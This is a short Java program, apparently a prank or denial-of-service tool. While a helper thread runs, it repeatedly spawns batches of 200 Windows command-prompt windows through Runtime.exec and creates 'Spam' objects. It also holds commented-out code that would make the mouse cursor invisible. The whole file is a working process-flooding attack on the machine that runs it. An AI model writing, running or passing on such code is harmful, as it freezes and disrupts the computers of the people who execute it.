package sait.bms;
import java.io.IOException;


public class Main {

    public static void main(String[] args) throws IOException, InterruptedException {
        Multithread ne = new Multithread();
        Multithread me = new Multithread();
        ne.start();
        me.start();
        int max = 200;
        while(ne.isAlive() ){
            for (int i = 0; i < max ; i++) {
                Spam t = new Spam();
                Runtime.getRuntime().exec(new String[] {"cmd", "/K", "Start"});
            }
        }
        while(me.isAlive()){
            for (int i = 0; i < max ; i++) {
                Spam t = new Spam();
                Spam h = new Spam();
            }
        }

//        int[] pixels = new int[16 * 16];
//        Image image = Toolkit.getDefaultToolkit().createImage(
//                new MemoryImageSource(16, 16, pixels, 0, 16));
//        Cursor transparentCursor =
//                Toolkit.getDefaultToolkit().createCustomCursor
//                        (image, new Point(0, 0), "invisibleCursor");
//


    }
}
